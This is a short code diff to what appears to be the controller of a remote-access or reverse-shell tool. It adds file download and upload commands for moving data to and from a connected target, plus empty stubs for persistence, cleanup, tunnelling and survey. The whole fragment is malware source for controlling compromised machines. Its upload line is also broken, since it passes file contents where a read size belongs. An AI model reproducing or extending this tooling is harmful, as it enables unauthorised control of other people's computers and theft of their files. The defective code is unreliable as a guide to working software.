@@ -36,6 +36,31 @@ def shell(target,ip):
             ips.remove(ip)
             break
 
+        elif command[:8] == "download":
+            with open(command[9:], "wb") as file:
+                file_data = receive()
+                file.write(base64.b64decode(file_data))
+
+        elif command[:6] == "upload":
+            with open(command[7:], "rb") as uload:
+                send(base64.b64encode(uload.read(uload.read())))
+
+
+        elif command == "unset":
+            pass
+
+        elif command == "persist":
+            pass
+
+        elif command == "clean":
+            pass
+
+        elif command == "tunnel":
+            pass
+
+        elif command == "survey":
+            pass
+
         elif command[:2] == "cd" and len(command) > 1:
             continue
         else:
